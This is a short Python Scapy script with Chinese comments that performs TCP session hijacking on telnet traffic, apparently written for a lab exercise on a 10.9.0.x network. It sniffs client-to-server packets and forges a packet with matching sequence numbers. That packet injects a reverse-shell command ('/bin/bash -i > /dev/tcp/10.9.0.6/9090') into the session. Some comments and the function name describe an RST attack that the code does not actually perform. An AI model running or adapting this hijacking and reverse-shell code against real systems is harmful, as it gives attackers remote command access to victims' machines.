from scapy.all import *

# 定义一个回调函数，用于处理嗅探到的TCP包
def rst_attack(pkt):
    # 如果包是TCP包，并且是SYN-ACK或ACK包，说明是TCP连接建立过程中的包
    # 简单排除一下要断开连接的情况
    if pkt[TCP].flags != "R" and pkt[TCP].flags !="F" :
        # 获取包的源IP、目的IP、源端口、目的端口和序列号
        src_ip = pkt[IP].src
        dst_ip = pkt[IP].dst
        src_port = pkt[TCP].sport
        dst_port = pkt[TCP].dport
        seq = pkt[TCP].seq
        ack = pkt[TCP].ack
        data = pkt.original
        print("<<<<<<new packet")
        print(data)
        #排除自己发的包，防止无限循环
        if not("/bin/bash -i > /dev/tcp/10.9.0.6/9090 0<&1 2>&1" in str(data)) :
            # 构造一个RST包，将源IP、目的IP、源端口、目的端口和序列号设置为与原包相反的值，且seq值为上一个包的ack值，这样就不用根据上一个seq和数据偏移量来计算下一个正确的seq值了
            ip = IP(src=src_ip, dst=dst_ip)
            tcp = TCP(sport=src_port, dport=dst_port, flags="A", seq=pkt[TCP].seq+10 ,ack=pkt[TCP].ack)
            rst = ip/tcp/HKdata
            # 发送伪造包
            send(rst, verbose=0)
            print("sniffpkt: seq{} ack{} \n***!!HK packet sent from {}:{} to {}:{} seq{}".format(seq, ack,src_ip, src_port, dst_ip, dst_port,  seq+10))
            print("over >>>>>>\n")
            ###just send one packet
            sys.exit()
        
        

striface=input("br...(iface):")
cliIP=input("client IP:(default 10.9.0.6)")
serverIP=input("server IP:(default 10.9.0.7)")
if len(cliIP)==0:
 cliIP='10.9.0.6'
 
if len(serverIP)==0:
 serverIP='10.9.0.7'
HKdata="\r /bin/bash -i > /dev/tcp/10.9.0.6/9090 0<&1 2>&1 \r"

#写好过滤器，根据输入的源和目的ip以及telnet协议的目的端口号进行筛选
ffilter = f"tcp and src host {cliIP} and dst host {serverIP} and dst port 23"


# 使用sniff函数嗅探网络上的TCP包，指定iface参数为网卡接口，指定prn参数为回调函数
sniff(filter=ffilter, iface=striface, prn=rst_attack)

